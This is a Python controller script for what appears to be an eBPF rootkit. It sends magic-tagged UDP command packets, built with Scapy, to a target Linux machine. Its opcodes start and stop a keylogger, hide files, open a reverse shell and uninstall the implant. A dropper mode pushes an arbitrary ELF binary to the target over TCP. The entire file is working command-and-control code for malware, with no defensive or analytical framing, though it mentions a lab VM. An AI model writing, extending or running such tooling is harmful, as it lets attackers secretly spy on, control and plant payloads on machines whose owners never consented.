import argparse
import socket
import struct
import sys
import time

from scapy.all import IP, UDP, send, raw

MAGIC = 0xABCDABCD
MAX_NAME_LEN = 32

DROPPER_PORT = 1339
DROPPER_SEND_DELAY_SECONDS = 1.5 # pause before streaming the ELF
MAX_ELF_SIZE = 256 * 1024 * 1024

# Map command names to opcodes and expected argument types
# Type options: "none", "string", "int"
COMMAND_MAP = {
    "keylogger_start":  {"opcode": 0, "type": "none"},
    "keylogger_stop":   {"opcode": 1, "type": "none"},
    "hide_file":   {"opcode": 2, "type": "string"},
    "unhide_file":   {"opcode": 3, "type": "string"},
    "reverse_shell_start":  {"opcode": 4, "type": "none"},
    "reverse_shell_stop":  {"opcode": 5, "type": "none"},
    "dropper_send": {"opcode": 6, "type": "string"},
    "uninstall":  {"opcode": 7, "type": "none"},
}

def build_payload(cmd_name: str, raw_arg: str | None) -> bytes:
    cmd_info = COMMAND_MAP[cmd_name]
    opcode = cmd_info["opcode"]
    arg_type = cmd_info["type"]

    arg_val = 0
    data_bytes = b"\x00" * MAX_NAME_LEN

    if arg_type == "none":
        # Leave arg=0 and data as null bytes
        pass

    elif arg_type == "string":
        if not raw_arg:
            raise ValueError(f"Command '{cmd_name}' requires a string argument (e.g., filename).")
        # Pack the user-provided string directly into command->data
        data_bytes = raw_arg.encode("utf-8")[:MAX_NAME_LEN].ljust(MAX_NAME_LEN, b"\x00")

    elif arg_type == "int":
        if not raw_arg:
            raise ValueError(f"Command '{cmd_name}' requires an integer argument (e.g., port number).")
        arg_val = int(raw_arg, 0)

    # C struct layout: u32 magic, u32 opcode, u32 arg, char data[MAX_NAME_LEN]
    fmt = f"<III{MAX_NAME_LEN}s"
    return struct.pack(fmt, MAGIC, opcode, arg_val, data_bytes)

def send_elf(host: str, elf_path: str, port: int = DROPPER_PORT,
             iface: str | None = None) -> None:
    """Stream [8-byte BE length][ELF bytes] to dropper_receive over TCP.

    Sleeps DROPPER_SEND_DELAY_SECONDS first, to give the target time to
    reach accept() after it was told to start listening.
    """
    with open(elf_path, "rb") as f:
        blob = f.read()

    if not blob:
        raise ValueError("ELF file is empty")
    if len(blob) > MAX_ELF_SIZE:
        raise ValueError(f"ELF exceeds MAX_ELF_SIZE ({MAX_ELF_SIZE} bytes)")

    if iface:
        print("[!] --iface has no effect in dropper_send mode "
              "(kernel routing is used for the TCP connection)", file=sys.stderr)

    print(f"[*] Waiting {DROPPER_SEND_DELAY_SECONDS}s before connecting to {host}:{port}...")
    time.sleep(DROPPER_SEND_DELAY_SECONDS)

    with socket.create_connection((host, port), timeout=30) as s:
        # Big-endian uint64 length, matching be64toh() on the receiver.
        s.sendall(len(blob).to_bytes(8, "big"))
        s.sendall(blob)
        s.shutdown(socket.SHUT_WR)   # half-close so the receiver sees EOF

    print(f"[+] Sent {len(blob)} bytes of ELF to {host}:{port} ({elf_path})")

def main():
    parser = argparse.ArgumentParser(description="eBPF UDP Command Controller")
    parser.add_argument("ip", help="Target UTM Linux VM IP address")
    parser.add_argument("command", choices=COMMAND_MAP.keys(), help="Command name")
    parser.add_argument("arg", nargs="?", default=None, help="Argument (filename or port)")
    
    parser.add_argument("-i", "--iface", default=None, help="Optional network interface (e.g., en0)")
    parser.add_argument("--dport", type=int, default=12345, help="Destination UDP port")

    args = parser.parse_args()

     # --- dropper_send: stream an ELF over TCP, bypassing the UDP path ---
        # --- dropper_send: UDP trigger, then stream the ELF over TCP ---
    if args.command == "dropper_send":
        if not args.arg:
            parser.error("dropper_send requires an ELF file path")

        # 1. Tell the target to start the dropper (UDP, opcode 6).
        try:
            payload = build_payload("dropper_send", args.arg)
            print("Hex payload:", payload.hex(" "))
        except ValueError as e:
            parser.error(str(e))

        pkt = IP(dst=args.ip) / UDP(sport=54321, dport=args.dport) / payload
        raw_pkt = IP(raw(pkt))
        if args.iface:
            send(raw_pkt, iface=args.iface, verbose=False)
        else:
            send(raw_pkt, verbose=False)
        print(f"[+] Sent 'dropper_send' trigger (Opcode 6) to {args.ip}:{args.dport}")

        # 2. Now stream the ELF over TCP.
        try:
            send_elf(args.ip, args.arg, port=DROPPER_PORT, iface=args.iface)
        except (OSError, ValueError) as e:
            parser.error(str(e))
        return
    
    # --- normal UDP command path ---
    try:
        payload = build_payload(args.command, args.arg)
        print("Hex payload:", payload.hex(" "))
    except ValueError as e:
        parser.error(str(e))

    # Construct Layer 3 Packet (macOS handles ARP/Ethernet resolution)
    pkt = IP(dst=args.ip) / UDP(sport=54321, dport=args.dport) / payload

    # Re-serialize to force Scapy to generate valid IP/UDP checksums
    raw_pkt = IP(raw(pkt))

    # Send using Layer 3 socket
    if args.iface:
        send(raw_pkt, iface=args.iface, verbose=False)
    else:
        send(raw_pkt, verbose=False)

    print(f"[+] Sent '{args.command}' (Opcode {COMMAND_MAP[args.command]['opcode']}) to {args.ip}:{args.dport}")

if __name__ == "__main__":
    main()
